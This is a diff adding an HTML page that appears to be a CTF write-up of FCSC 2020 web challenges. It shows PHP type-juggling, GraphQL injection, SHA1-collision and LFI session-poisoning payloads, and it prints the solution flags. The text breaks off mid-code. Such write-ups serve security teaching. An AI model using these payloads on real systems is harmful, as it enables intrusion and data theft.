@@ -1,0 +1,532 @@
+<!doctype html>
+<html class="not-ready lg:text-base overflow-y-scroll scroll-pt-14" lang="en">
+
+<head prefix="og: https://ogp.me/ns# article: https://ogp.me/ns/article#">
+  <meta charset="utf-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" />
+  <meta name="generator" content="Zola" />
+  <title>FCSC - CTF Writeup | Swissky's Lab</title>
+  <meta property="og:site_name" content="Swissky&apos;s Lab" />
+  <meta property="og:title" content="FCSC - CTF Writeup" />
+  <meta name="description" content="FCSC - FRANCE CYBERSECURITY CHALLENGE 2020Some writeups of severals web challenges from the FCSC 2020" />
+  <meta property="og:description" content="FCSC - FRANCE CYBERSECURITY CHALLENGE 2020Some writeups of severals web challenges from the FCSC 2020" />
+  <meta property="og:url" content="https://swisskyrepo.github.io/blog/fcsc/" />
+  <link rel="canonical" href="https://swisskyrepo.github.io/blog/fcsc/" />
+  <meta property="og:type" content="article" />
+  <meta property="article:published_time" content="2020-04-26T00:00:00+00:00" />
+  <meta property="og:image" content="https://swisskyrepo.github.io/images/FCSC/2020-fcsc-logo.jpg" />
+  <meta property="og:image:alt" content="FCSC - CTF Writeup" />
+  <meta property="og:image:width" content="1667" />
+  <meta property="og:image:height" content="1667" />
+  <meta property="og:image:type" content="image/jpeg" />
+  <link rel="alternate" type="application/atom+xml" href="https://swisskyrepo.github.io/atom.xml" title="Swissky&apos;s Lab | Atom" />
+  <link rel="alternate" type="application/rss+xml" href="https://swisskyrepo.github.io/rss.xml" title="Swissky&apos;s Lab | RSS" />
+  <link rel="license" href="https://creativecommons.org/licenses/by-sa/4.0/deed" />
+  <!-- Begin Head inject -->
+  
+  <!-- End Head inject -->
+  <link rel="stylesheet" href="https://swisskyrepo.github.io/main.min.css?h=fc65ba308cf36d3ba82c" />
+  <style>
+  :root{--bg: #f4f4f5; --header: #e4e4e7; color-scheme: light;}
+  :root.dark{--bg: #18181b; --header: #27272a; color-scheme: dark;}
+  </style>
+  <meta name="theme-color" data-light="#e4e4e7" data-dark="#27272a" content="#e4e4e7" />
+  <link rel="icon" type="image/x-icon" sizes="16x16" href="https://swisskyrepo.github.io/favicon.ico" />
+  <link rel="apple-touch-icon" type="image/png" href="https://swisskyrepo.github.io/apple-touch-icon.png?h=58bee300054c5308feb3" />
+  <link rel="icon" type="image/png" href="https://swisskyrepo.github.io/android-icon.png?h=8d80ec95446bd2c36826" />
+  <script src="https://swisskyrepo.github.io/js/linkita.min.js?h=1dd3ed42fc674277bc34"></script>
+  <script src="https://swisskyrepo.github.io/js/linkita-search.min.js?h=698547b4b081d012c661"></script>
+  <!-- Begin Head End inject -->
+  <!-- Umami analytics -->
+<script defer src="https://cloud.umami.is/script.js" data-website-id="3da49f88-7825-49a6-b9cf-de0c7610e7dc"></script>
+
+<!-- Custom CSS -->
+<link rel="stylesheet" href="https://swisskyrepo.github.io/files/custom.css">
+
+<!-- HEAD END -->
+  <!-- End Head End inject -->
+</head>
+
+<body class="text-black duration-100 ease-out bg-[var(--bg)] dark:text-white">
+  <!-- Header -->
+<header class="bg-[var(--header)] fixed top-0 z-40 mx-auto min-h-[3.25rem] w-full header-icons">
+  <div class="mx-auto w-full max-w-4xl p-2.5 lg:flex lg:justify-between">
+    <div class="flex justify-between">
+      <div class="flex items-center min-h-8">
+        <a title="Go to home page" accesskey="!"
+          href="https://swisskyrepo.github.io/" class="text-2xl font-semibold">Swissky&#x27;s Lab</a>
+        <button type="button" title="Switch color scheme" accesskey="$"
+          onclick="window.linkita.toggleDarkMode();" ondblclick="window.linkita.resetDarkMode();"
+          class="btn-dark ml-4 h-6 w-6 shrink-0 cursor-pointer text-[0] bg-center bg-no-repeat bg-cover dark:invert [background-image:var(--icon-theme-dark)] dark:[background-image:var(--icon-theme-light)]"
+        ></button>
+        <button type="button" title="Search" accesskey="/"
+          onclick="window.linkita.toggleSearch();"
+          class="btn-search ml-4 h-6 w-6 shrink-0 cursor-pointer text-[0] bg-center bg-no-repeat bg-cover [background-image:var(--icon-search)] dark:invert"
+        ></button>
+        <script>window.linkita.initSearchButton({ scripts: ["https://swisskyrepo.github.io/elasticlunr.min.js", "https://swisskyrepo.github.io/search_index.en.js"] });</script>
+      </div>
+      <div title="Menu" role="button" accesskey="+" tabindex="0"
+        class="btn-menu relative z-50 flex h-8 w-8 shrink-0 cursor-pointer flex-col items-center justify-center gap-2.5 lg:hidden"
+        onclick="window.linkita.toggleHeaderMenu();"
+        onkeydown="(event.keyCode == 13 || event.keyCode == 32) ? event.preventDefault() || window.linkita.toggleHeaderMenu() : true;"
+      ></div>
+    </div>
+    <nav class="flex w-full items-center lg:w-auto">
+      <menu
+        class="nav-wrapper flex w-full flex-col py-2 lg:w-auto lg:flex-row lg:self-center lg:py-0">
+        <li>
+          <a
+            class="primary-link block py-2 text-center text-lg font-medium lg:px-3 lg:py-0"
+            href="https://swisskyrepo.github.io/projects"
+          >Projects</a>
+        </li>
+        <li>
+          <a
+            class="primary-link block py-2 text-center text-lg font-medium lg:px-3 lg:py-0"
+            href="https://swisskyrepo.github.io/posts"
+          >Posts</a>
+        </li>
+        <li>
+          <a
+            class="primary-link block py-2 text-center text-lg font-medium lg:px-3 lg:py-0"
+            href="https://swisskyrepo.github.io/about"
+          >About</a>
+        </li>
+      </menu>
+      <!-- Begin Header Nav inject -->
+      
+      <!-- End Header Nav inject -->
+    </nav>
+  </div>
+</header>
+
+  <!-- Begin Body Start inject -->
+  
+  <!-- End Body Start inject -->
+  <main class="prose prose-neutral relative mx-auto min-h-[calc(100%-4rem)]
+    max-w-3xl break-words px-4 pb-12 pt-28 lg:pt-32 dark:prose-invert prose-pre:rounded-lg prose-img:rounded-lg">
+      <!-- Search -->
+<div id="linkita-search-wrapper" class="hidden">
+  <ul id="linkita-search-results"></ul>
+</div>
+
+    
+<article>
+  <!-- Begin Page Start inject -->
+  
+  <!-- End Page Start inject -->
+
+  <header class="mb-16">
+    <h1 class="!my-0 pb-2.5">FCSC - CTF Writeup</h1>
+    <!-- Page Info -->
+<div class="text-sm antialiased opacity-80"><time
+      datetime="2020-04-26T00:00:00+00:00">2020-04-26</time><span
+        class="mx-1">&middot;</span><time
+    datetime="PT0H6M0S">6&nbsp;min</time>
+</div>
+
+  </header>
+  <figure class="mb-12 mt-0">
+    <img
+      class="h-auto w-full rounded-lg"
+      src="https://swisskyrepo.github.io/images/FCSC/2020-fcsc-logo.jpg"
+      alt="FCSC - CTF Writeup"
+      width="1667"
+      height="1667"
+    />
+  </figure>
+  <!-- TOC -->
+<div class="block-bg mb-12 rounded-lg p-2 text-lg">
+  <details>
+    <summary class="select-none py-0.5 lg:py-1 pl-4" accesskey="=">
+      <span class="cursor-pointer">Table of Contents</span>
+    </summary>
+    <div class="px-2">
+      <ul>
+        <li>
+          <a class="no-underline hover:underline" href="https://swisskyrepo.github.io/blog/fcsc/#fcsc-france-cybersecurity-challenge-2020">FCSC - FRANCE CYBERSECURITY CHALLENGE 2020</a>
+          <ul>
+            <li>
+              <a class="no-underline hover:underline" href="https://swisskyrepo.github.io/blog/fcsc/#web-enterthedungeon">WEB - EnterTheDungeon</a>
+            </li>
+            <li>
+              <a class="no-underline hover:underline" href="https://swisskyrepo.github.io/blog/fcsc/#web-rainbow-pages">WEB - Rainbow Pages</a>
+            </li>
+            <li>
+              <a class="no-underline hover:underline" href="https://swisskyrepo.github.io/blog/fcsc/#web-rainbow-pages-v2">WEB - Rainbow Pages v2</a>
+            </li>
+            <li>
+              <a class="no-underline hover:underline" href="https://swisskyrepo.github.io/blog/fcsc/#web-revision">WEB - Revision</a>
+            </li>
+            <li>
+              <a class="no-underline hover:underline" href="https://swisskyrepo.github.io/blog/fcsc/#web-bestiary">WEB - Bestiary</a>
+            </li>
+            <li>
+              <a class="no-underline hover:underline" href="https://swisskyrepo.github.io/blog/fcsc/#web-lipogramme">WEB - Lipogramme</a>
+            </li>
+            <li>
+              <a class="no-underline hover:underline" href="https://swisskyrepo.github.io/blog/fcsc/#web-flag-checker">WEB - Flag Checker</a>
+            </li>
+            <li>
+              <a class="no-underline hover:underline" href="https://swisskyrepo.github.io/blog/fcsc/#forensic-petite-frappe-2">Forensic - Petite frappe 2</a>
+            </li>
+            <li>
+              <a class="no-underline hover:underline" href="https://swisskyrepo.github.io/blog/fcsc/#intro-babel">Intro - Babel</a>
+            </li>
+            <li>
+              <a class="no-underline hover:underline" href="https://swisskyrepo.github.io/blog/fcsc/#intro-sushi">Intro - SuSHi</a>
+            </li>
+            <li>
+              <a class="no-underline hover:underline" href="https://swisskyrepo.github.io/blog/fcsc/#intro-tarte-tatin">Intro - Tarte Tatin</a>
+            </li>
+            <li>
+              <a class="no-underline hover:underline" href="https://swisskyrepo.github.io/blog/fcsc/#intro-le-rat-conteur">Intro - Le Rat Conteur</a>
+            </li>
+            <li>
+              <a class="no-underline hover:underline" href="https://swisskyrepo.github.io/blog/fcsc/#intro-sbox">Intro - Sbox</a>
+            </li>
+          </ul>
+        </li>
+      </ul>
+    </div>
+  </details>
+</div>
+
+  <!-- Content -->
+  <section><h2 id="fcsc-france-cybersecurity-challenge-2020">FCSC - FRANCE CYBERSECURITY CHALLENGE 2020</h2>
+<p>Some writeups of severals web challenges from the <a rel="external" href="https://france-cybersecurity-challenge.fr">FCSC 2020</a>.</p>
+<p><img src="/images/FCSC/2020-fcsc-logo.jpg" alt="https://www.ssi.gouv.fr/uploads/2020/03/2020-fcsc-logo.jpg" /></p>
+<span id="continue-reading"></span>
+<h3 id="web-enterthedungeon">WEB - EnterTheDungeon</h3>
+<p>The source code of the check_secret.php is given at <code>view-source:challenges2.france-cybersecurity-challenge.fr:5002/check_secret.txt</code>. The following code is stripped to keep only the interesting part.</p>
+<pre class="giallo" style="color: #E1E4E8; background-color: #24292E;"><code data-lang="php"><span class="giallo-l"><span style="color: #F97583;">&lt;?</span><span style="color: #79B8FF;">php</span></span>
+<span class="giallo-l"><span style="color: #79B8FF;">	session_start</span><span>();</span></span>
+<span class="giallo-l"><span>	$_SESSION[</span><span style="color: #9ECBFF;">&#39;dungeon_master&#39;</span><span>]</span><span style="color: #F97583;"> =</span><span style="color: #79B8FF;"> 0</span><span>;</span></span>
+<span class="giallo-l"><span style="color: #F97583;">?&gt;</span></span>
+<span class="giallo-l"><span style="color: #F97583;">&lt;?</span><span style="color: #79B8FF;">php</span></span>
+<span class="giallo-l"><span style="color: #F97583;">	include</span><span>(</span><span style="color: #9ECBFF;">&#39;./ecsc.txt&#39;</span><span>);</span></span>
+<span class="giallo-l"><span style="color: #79B8FF;">	echo chr</span><span>(</span><span style="color: #79B8FF;">10</span><span>)</span><span style="color: #F97583;">.</span><span style="color: #9ECBFF;">&#39;&lt;/pre&gt;&#39;</span><span>;</span></span>
+<span class="giallo-l"><span style="color: #6A737D;">	// authentication is replaced by an impossible test</span></span>
+<span class="giallo-l"><span style="color: #6A737D;">	//if(md5($_GET[&#39;secret&#39;]) == &quot;a5de2c87ba651432365a5efd928ee8f2&quot;)</span></span>
+<span class="giallo-l"><span style="color: #F97583;">	if</span><span>(</span><span style="color: #79B8FF;">md5</span><span>($_GET[</span><span style="color: #9ECBFF;">&#39;secret&#39;</span><span>])</span><span style="color: #F97583;"> ==</span><span> $_GET[</span><span style="color: #9ECBFF;">&#39;secret&#39;</span><span>])</span></span>
+<span class="giallo-l"><span>	{</span></span>
+<span class="giallo-l"><span>		$_SESSION[</span><span style="color: #9ECBFF;">&#39;dungeon_master&#39;</span><span>]</span><span style="color: #F97583;"> =</span><span style="color: #79B8FF;"> 1</span><span>;</span></span>
+<span class="giallo-l"><span style="color: #79B8FF;">		echo</span><span style="color: #9ECBFF;"> &quot;Secret is correct, welcome Master ! You can now enter the dungeon&quot;</span><span>;</span></span>
+<span class="giallo-l"><span>	}</span></span>
+<span class="giallo-l"><span style="color: #F97583;">?&gt;</span></span></code></pre>
+<p>We can clearly see it is about PHP Type Juggling since we are comparing <code>md5($_GET['secret'])</code> with its value.</p>
+<p>In PHP a value starting with <strong>0e</strong> and followed by numbers is considered as a float, and some MD5(value) will also result in <strong>0e[0-9]{30}</strong>. The comparison will then occured on two float numbers, since the code is using <strong>==</strong> instead of <strong>===</strong>, PHP will only check the object type and not the value.</p>
+<p>We can validate the challenge using the value <strong>0e1137126905</strong> : http://challenges2.france-cybersecurity-challenge.fr:5002/check_secret.php?secret=0e1137126905</p>
+<blockquote>
+<p>Flag: FCSC{f67aaeb3b15152b216cb1addbf0236c66f9d81c4487c4db813c1de8603bb2b5b}</p>
+</blockquote>
+<h3 id="web-rainbow-pages">WEB - Rainbow Pages</h3>
+<p>This challenge is a basic GraphQL injection, first we see a request is made to <strong>http://challenges2.france-cybersecurity-challenge.fr:5006/index.php?search=[BASE64]</strong>.</p>
+<p>Since most of the tools doesn't allow to interact with base64 I opted to build to simple proxy in Python using Flask.</p>
+<pre class="giallo" style="color: #E1E4E8; background-color: #24292E;"><code data-lang="python"><span class="giallo-l"><span style="color: #F97583;">from</span><span> flask</span><span style="color: #F97583;"> import</span><span> Flask</span></span>
+<span class="giallo-l"><span style="color: #F97583;">from</span><span> flask</span><span style="color: #F97583;"> import</span><span> request</span></span>
+<span class="giallo-l"><span style="color: #F97583;">import</span><span> requests</span></span>
+<span class="giallo-l"><span>app</span><span style="color: #F97583;"> =</span><span> Flask(</span><span style="color: #79B8FF;">__name__</span><span>)</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span style="color: #B392F0;">@app.route</span><span>(</span><span style="color: #9ECBFF;">&quot;/graphql&quot;</span><span>,</span><span style="color: #FFAB70;"> methods</span><span style="color: #F97583;">=</span><span>[</span><span style="color: #9ECBFF;">&#39;GET&#39;</span><span>])</span></span>
+<span class="giallo-l"><span style="color: #F97583;">def</span><span style="color: #B392F0;"> graphql</span><span>():</span></span>
+<span class="giallo-l"><span style="color: #79B8FF;">    print</span><span>(request)</span></span>
+<span class="giallo-l"><span>    query</span><span style="color: #F97583;"> =</span><span> request.args.get(</span><span style="color: #9ECBFF;">&#39;query&#39;</span><span>)</span></span>
+<span class="giallo-l"><span>    url</span><span style="color: #F97583;"> =</span><span style="color: #9ECBFF;"> &quot;http://challenges2.france-cybersecurity-challenge.fr:5006/index.php?search=&quot;</span></span>
+<span class="giallo-l"><span>    data</span><span style="color: #F97583;"> =</span><span> requests.get(url</span><span style="color: #F97583;"> +</span><span> query.encode(</span><span style="color: #9ECBFF;">&quot;base64&quot;</span><span>)).text</span></span>
+<span class="giallo-l"><span style="color: #F97583;">    return</span><span> data</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span style="color: #F97583;">if</span><span style="color: #79B8FF;"> __name__</span><span style="color: #F97583;"> ==</span><span style="color: #9ECBFF;"> &#39;__main__&#39;</span><span>:</span></span>
+<span class="giallo-l"><span>      app.run(</span><span style="color: #FFAB70;">host</span><span style="color: #F97583;">=</span><span style="color: #9ECBFF;">&#39;0.0.0.0&#39;</span><span>,</span><span style="color: #FFAB70;"> port</span><span style="color: #F97583;">=</span><span style="color: #79B8FF;">4646</span><span>)</span></span></code></pre>
+<p>Now every request fired to <code>/graphl?query=[SOMETHING]</code> will be "converted" for the challenge, and the result will be displayed in the page. We can now use every tools to ease our work, I like to use Altair as it's really beautiful :)</p>
+<p>![GraphQL]({{ site.baseurl }}/images/FCSC/graphql1proxy.png "GraphL Altair"){: .center-image }</p>
+<p>We can send the instrospection query in order to discover the schema of the GraphQL : https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/GraphQL%20Injection#enumerate-database-schema-via-introspection.</p>
+<p>It looks like that, once converted : <a rel="external" href="http://challenges2.france-cybersecurity-challenge.fr:5006/index.php?search=ZnJhZ21lbnQgRnVsbFR5cGUgb24gX19UeXBlIHsKICBraW5kCiAgbmFtZQogIGRlc2NyaXB0aW9uCiAgZmllbGRzKGluY2x1ZGVEZXByZWNhdGVkOiB0cnVlKSB7CiAgICBuYW1lCiAgICBkZXNjcmlwdGlvbgogICAgYXJncyB7CiAgICAgIC4uLklucHV0VmFsdWUKICAgIH0KICAgIHR5cGUgewogICAgICAuLi5UeXBlUmVmCiAgICB9CiAgICBpc0RlcHJlY2F0ZWQKICAgIGRlcHJlY2F0aW9uUmVhc29uCiAgfQogIGlucHV0RmllbGRzIHsKICAgIC4uLklucHV0VmFsdWUKICB9CiAgaW50ZXJmYWNlcyB7CiAgICAuLi5UeXBlUmVmCiAgfQogIGVudW1WYWx1ZXMoaW5jbHVkZURlcHJlY2F0ZWQ6IHRydWUpIHsKICAgIG5hbWUKICAgIGRlc2NyaXB0aW9uCiAgICBpc0RlcHJlY2F0ZWQKICAgIGRlcHJlY2F0aW9uUmVhc29uCiAgfQogIHBvc3NpYmxlVHlwZXMgewogICAgLi4uVHlwZVJlZgogIH0KfQpmcmFnbWVudCBJbnB1dFZhbHVlIG9uIF9fSW5wdXRWYWx1ZSB7CiAgbmFtZQogIGRlc2NyaXB0aW9uCiAgdHlwZSB7CiAgICAuLi5UeXBlUmVmCiAgfQogIGRlZmF1bHRWYWx1ZQp9CmZyYWdtZW50IFR5cGVSZWYgb24gX19UeXBlIHsKICBraW5kCiAgbmFtZQogIG9mVHlwZSB7CiAgICBraW5kCiAgICBuYW1lCiAgICBvZlR5cGUgewogICAgICBraW5kCiAgICAgIG5hbWUKICAgICAgb2ZUeXBlIHsKICAgICAgICBraW5kCiAgICAgICAgbmFtZQogICAgICAgIG9mVHlwZSB7CiAgICAgICAgICBraW5kCiAgICAgICAgICBuYW1lCiAgICAgICAgICBvZlR5cGUgewogICAgICAgICAgICBraW5kCiAgICAgICAgICAgIG5hbWUKICAgICAgICAgICAgb2ZUeXBlIHsKICAgICAgICAgICAgICBraW5kCiAgICAgICAgICAgICAgbmFtZQogICAgICAgICAgICAgIG9mVHlwZSB7CiAgICAgICAgICAgICAgICBraW5kCiAgICAgICAgICAgICAgICBuYW1lCiAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgICB9CiAgICAgICAgfQogICAgICB9CiAgICB9CiAgfQp9CgpxdWVyeSBJbnRyb3NwZWN0aW9uUXVlcnkgewogIF9fc2NoZW1hIHsKICAgIHF1ZXJ5VHlwZSB7CiAgICAgIG5hbWUKICAgIH0KICAgIG11dGF0aW9uVHlwZSB7CiAgICAgIG5hbWUKICAgIH0KICAgIHR5cGVzIHsKICAgICAgLi4uRnVsbFR5cGUKICAgIH0KICAgIGRpcmVjdGl2ZXMgewogICAgICBuYW1lCiAgICAgIGRlc2NyaXB0aW9uCiAgICAgIGxvY2F0aW9ucwogICAgICBhcmdzIHsKICAgICAgICAuLi5JbnB1dFZhbHVlCiAgICAgIH0KICAgIH0KICB9Cn0K">CLICK ME</a> also Altair provide a simple listing of the "object" and can build a query for you.</p>
+<p>From there it was easy to click on the "Altair Button" to ask for the flag :P</p>
+<p>![GraphQL]({{ site.baseurl }}/images/FCSC/graphql1simple.png "Ask for the flag"){: .center-image }</p>
+<h3 id="web-rainbow-pages-v2">WEB - Rainbow Pages v2</h3>
+<p>Another iteration of the GraphQL challenge available at http://challenges2.france-cybersecurity-challenge.fr:5007/. We can reuse our python proxy.</p>
+<p>It appears we were inside a query instead of sending the full query like in the 1st challenge. Let's fuzz the input to see if we can trigger some errors to help understand where we are injecting.</p>
+<p>![Fuzzing GraphQL input]({{ site.baseurl }}/images/FCSC/graphql2leakquery.png "Fuzzing the input"){: .center-image }</p>
+<p>The blockstring <code>"""</code> helps us discover part of the query, we are inside a weird filter like the following request.</p>
+<pre class="giallo" style="color: #E1E4E8; background-color: #24292E;"><code data-lang="javascript"><span class="giallo-l"><span>{</span></span>
+<span class="giallo-l"><span style="color: #B392F0;">  Movie</span><span>(filter: { OR: [{ year_lt:</span><span style="color: #79B8FF;"> 1920</span><span> }, { title_contains:</span><span style="color: #9ECBFF;"> &quot;River Runs&quot;</span><span> }] }) {</span></span>
+<span class="giallo-l"><span>    title</span></span>
+<span class="giallo-l"><span>  }</span></span>
+<span class="giallo-l"><span>}</span></span></code></pre>
+<p>Now we can try to recreate the end of the query, and add our evil payload. At first I tried to replicate a GraphQL query using <strong>OR</strong> in the previous challenge thanks to the proxy.</p>
+<p>![GraphQL Filter]({{ site.baseurl }}/images/FCSC/graphql2proxyor.png "GraphQL Filter"){: .center-image }</p>
+<p>Then we can try to request the flag, however it is not labelled like the other challenge, but the errors are quite straightforward and will suggest the correct name.</p>
+<pre class="giallo" style="color: #E1E4E8; background-color: #24292E;"><code data-lang="javascript"><span class="giallo-l"><span>Isaac</span><span style="color: #F97583;">%</span><span style="color: #9ECBFF;">&quot;}}, {lastname: {like: &quot;</span><span style="color: #F97583;">%</span><span>barton</span><span style="color: #F97583;">%</span><span style="color: #9ECBFF;">&quot;}}]}) {      nodes { firstname, lastname, speciality, price      }   }   __schema{types{name}}}</span><span style="color: #FDAEB7;font-style: italic;">#</span></span></code></pre>
+<p>![GraphQL Suggest]({{ site.baseurl }}/images/FCSC/graphql2suggestion.png "GraphQL suggest"){: .center-image }</p>
+<p>Now let's get the flag !</p>
+<pre class="giallo" style="color: #E1E4E8; background-color: #24292E;"><code data-lang="javascript"><span class="giallo-l"><span>Isaac</span><span style="color: #F97583;">%</span><span style="color: #9ECBFF;">&quot;}}, {lastname: {like: &quot;</span><span style="color: #F97583;">%</span><span>barton</span><span style="color: #F97583;">%</span><span style="color: #9ECBFF;">&quot;}}]}) {      nodes { firstname, lastname, speciality, price      }   }  flagNotTheSameTableNameById(id: 1){flagNotTheSameFieldName}}</span><span style="color: #FDAEB7;font-style: italic;">#</span></span></code></pre>
+<p>![GraphQL]({{ site.baseurl }}/images/FCSC/graphql2flag.png "Ask for the flag"){: .center-image }</p>
+<h3 id="web-revision">WEB - Revision</h3>
+<p>Once again the source code is provided, we have to upload two files but they must have the same SHA1 hashes.</p>
+<pre class="giallo" style="color: #E1E4E8; background-color: #24292E;"><code data-lang="python"><span class="giallo-l"><span>    attachments</span><span style="color: #F97583;"> =</span><span style="color: #79B8FF;"> set</span><span>([f1_hash, f2_hash])</span></span>
+<span class="giallo-l"><span style="color: #6A737D;">    # Debug debug...</span></span>
+<span class="giallo-l"><span style="color: #F97583;">    if</span><span style="color: #79B8FF;"> len</span><span>(attachments)</span><span style="color: #F97583;"> &lt;</span><span style="color: #79B8FF;"> 2</span><span>:</span></span>
+<span class="giallo-l"><span style="color: #F97583;">        raise</span><span> StoreError([f1_hash, f2_hash],</span><span style="color: #79B8FF;"> self</span><span>._get_flag())</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span style="color: #F97583;">def</span><span style="color: #B392F0;"> _get_flag</span><span>(self):</span></span>
+<span class="giallo-l"><span style="color: #F97583;">    with</span><span style="color: #79B8FF;"> open</span><span>(</span><span style="color: #9ECBFF;">&#39;flag.txt&#39;</span><span>,</span><span style="color: #9ECBFF;"> &#39;r&#39;</span><span>)</span><span style="color: #F97583;"> as</span><span> f:</span></span>
+<span class="giallo-l"><span>        flag</span><span style="color: #F97583;"> =</span><span> f.read()</span></span>
+<span class="giallo-l"><span style="color: #F97583;">    return</span><span> flag</span></span></code></pre>
+<p>We find two files with a SHA1 collisions on Corkami's Github:</p>
+<ul>
+<li>https://github.com/corkami/collisions/blob/master/examples/dualjpg1.pdf</li>
+<li>https://github.com/corkami/collisions/blob/master/examples/dualjpg2.pdf</li>
+</ul>
+<blockquote>
+<p>FCSC{8f95b0fc1a793e102a65bae9c473e9a3c2893cf083a539636b082605c40c00c1}</p>
+</blockquote>
+<h3 id="web-bestiary">WEB - Bestiary</h3>
+<p>Bestiary was a classic Local File Inclusion, abusing the session to execute arbitrary commands on the server.</p>
+<p>First we can grab the source code by using a PHP filter : <code>challenges2.france-cybersecurity-challenge.fr:5004/index.php?monster=php://filter/convert.iconv.utf-8.utf-16/resource=index.php</code>. It will be displayed as UTF16 thus not being interpreted as a PHP code. Here is a curated extract of the code.</p>
+<pre class="giallo" style="color: #E1E4E8; background-color: #24292E;"><code data-lang="php"><span class="giallo-l"><span style="color: #F97583;">&lt;?</span><span style="color: #79B8FF;">php</span></span>
+<span class="giallo-l"><span style="color: #79B8FF;">	session_save_path</span><span>(</span><span style="color: #9ECBFF;">&quot;./sessions/&quot;</span><span>);</span></span>
+<span class="giallo-l"><span style="color: #79B8FF;">	session_start</span><span>();</span></span>
+<span class="giallo-l"><span style="color: #F97583;">	include_once</span><span>(</span><span style="color: #9ECBFF;">&#39;flag.php&#39;</span><span>);</span><span style="color: #6A737D;">   // &lt;------------------------------------ the flag is inside this</span></span>
+<span class="giallo-l"><span style="color: #F97583;">?&gt;</span></span>
+<span class="giallo-l"><span>    [</span><span style="color: #F97583;">...</span><span>]</span></span>
+<span class="giallo-l"><span>	$monster</span><span style="color: #F97583;"> =</span><span style="color: #79B8FF;"> NULL</span><span>;</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span style="color: #F97583;">	if</span><span>(</span><span style="color: #79B8FF;">isset</span><span>($_SESSION[</span><span style="color: #9ECBFF;">&#39;monster&#39;</span><span>])</span><span style="color: #F97583;"> &amp;&amp; !</span><span style="color: #79B8FF;">empty</span><span>($_SESSION[</span><span style="color: #9ECBFF;">&#39;monster&#39;</span><span>]))</span></span>
+<span class="giallo-l"><span>		$monster</span><span style="color: #F97583;"> =</span><span> $_SESSION[</span><span style="color: #9ECBFF;">&#39;monster&#39;</span><span>];</span></span>
+<span class="giallo-l"><span style="color: #F97583;">	if</span><span>(</span><span style="color: #79B8FF;">isset</span><span>($_GET[</span><span style="color: #9ECBFF;">&#39;monster&#39;</span><span>])</span><span style="color: #F97583;"> &amp;&amp; !</span><span style="color: #79B8FF;">empty</span><span>($_GET[</span><span style="color: #9ECBFF;">&#39;monster&#39;</span><span>]))</span></span>
+<span class="giallo-l"><span>	{</span></span>
+<span class="giallo-l"><span>		$monster</span><span style="color: #F97583;"> =</span><span> $_GET[</span><span style="color: #9ECBFF;">&#39;monster&#39;</span><span>];</span></span>
+<span class="giallo-l"><span>		$_SESSION[</span><span style="color: #9ECBFF;">&#39;monster&#39;</span><span>]</span><span style="color: #F97583;"> =</span><span> $monster;</span></span>
+<span class="giallo-l"><span>	}</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span style="color: #F97583;">	if</span><span>($monster</span><span style="color: #F97583;"> !==</span><span style="color: #79B8FF;"> NULL</span><span style="color: #F97583;"> &amp;&amp;</span><span style="color: #79B8FF;"> strpos</span><span>($monster,</span><span style="color: #9ECBFF;"> &quot;flag&quot;</span><span>)</span><span style="color: #F97583;"> ===</span><span style="color: #79B8FF;"> False</span><span>)</span></span>
+<span class="giallo-l"><span style="color: #F97583;">		include</span><span>($monster);</span><span style="color: #6A737D;">      // &lt;-------------------------------------- vulnerability is here</span></span>
+<span class="giallo-l"><span style="color: #F97583;">	else</span></span>
+<span class="giallo-l"><span style="color: #79B8FF;">		echo</span><span style="color: #9ECBFF;"> &quot;Select a monster to read his description.&quot;</span><span>;</span></span>
+<span class="giallo-l"><span style="color: #F97583;">?&gt;</span></span></code></pre>
+<p>We want to include the content of <strong>flag.php</strong> and bypass the filter <code>strpos($monster, "flag")</code> which denies us to directly use our wrapper to access flag.php.</p>
+<p>The PHP code is changing the default path to save temporary file used to store PHP sessions. In PHP when you have a cookie <code>PHP_SESSID=3ba53bc0ae7fea081347b3f1f8cf0c41</code> there is a file named <code>sessions/sess_3ba53bc0ae7fea081347b3f1f8cf0c41</code> containing a "serialized" version of the cookie.</p>
+<ol>
+<li>First we need to put our payload inside our session file : <code>http://challenges2.france-cybersecurity-challenge.fr:5004/index.php?monster=&lt;?php%20echo%20file_get_contents(%27fl%27.%27ag.php%27);%20?&gt;</code>.</li>
+<li>Then we include our session file <code>http://challenges2.france-cybersecurity-challenge.fr:5004/index.php?monster=/var/www/html/sessions/sess_3ba53bc0ae7fea081347b3f1f8cf0c41</code></li>
+</ol>
+<p>![LFI]({{ site.baseurl }}/images/FCSC/lfi.png "LFI"){: .center-image }</p>
+<blockquote>
+<p>$flag="FCSC{83f5d0d1a3c9c82da282994e348ef49949ea4977c526634960f44b0380785622}";</p>
+</blockquote>
+<h3 id="web-lipogramme">WEB - Lipogramme</h3>
+<p>We have the following source code, which implement a filter to limit the code executed on the server.</p>
+<pre class="giallo" style="color: #E1E4E8; background-color: #24292E;"><code data-lang="php"><span class="giallo-l"><span style="color: #F97583;">&lt;?</span><span style="color: #79B8FF;">php</span></span>
+<span class="giallo-l"><span style="color: #F97583;">    if</span><span> (</span><span style="color: #79B8FF;">isset</span><span>($_GET[</span><span style="color: #9ECBFF;">&#39;code&#39;</span><span>])) {</span></span>
+<span class="giallo-l"><span>        $code</span><span style="color: #F97583;"> =</span><span style="color: #79B8FF;"> substr</span><span>($_GET[</span><span style="color: #9ECBFF;">&#39;code&#39;</span><span>],</span><span style="color: #79B8FF;"> 0</span><span>,</span><span style="color: #79B8FF;"> 250</span><span>);</span></span>
+<span class="giallo-l"><span style="color: #F97583;">        if</span><span> (</span><span style="color: #79B8FF;">preg_match</span><span>(</span><span style="color: #9ECBFF;">&#39;/</span><span style="color: #DBEDFF;">a|e|i|o|u|y|[0-9]</span><span style="color: #9ECBFF;">/i&#39;</span><span>, $code)) {</span></span>
+<span class="giallo-l"><span style="color: #F97583;">            die</span><span>(</span><span style="color: #9ECBFF;">&#39;No way! Go away!&#39;</span><span>);</span></span>
+<span class="giallo-l"><span>        }</span><span style="color: #F97583;"> else</span><span> {</span></span>
+<span class="giallo-l"><span style="color: #F97583;">            try</span><span> {</span></span>
+<span class="giallo-l"><span style="color: #79B8FF;">                eval</span><span>($code);</span></span>
